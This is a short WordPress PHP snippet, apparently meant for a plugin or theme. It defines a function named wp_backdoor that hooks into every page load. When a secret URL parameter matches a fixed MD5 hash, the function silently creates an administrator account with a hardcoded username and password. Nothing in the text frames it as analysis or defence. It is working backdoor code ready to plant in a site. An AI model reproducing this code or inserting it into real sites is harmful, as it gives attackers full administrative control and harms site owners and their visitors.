<?php
add_action( 'wp_head', 'wp_backdoor' );

function wp_backdoor() {
    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'username' ) ) {
            $user_id = wp_create_user( 'username', 'pa55w0rd!' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}
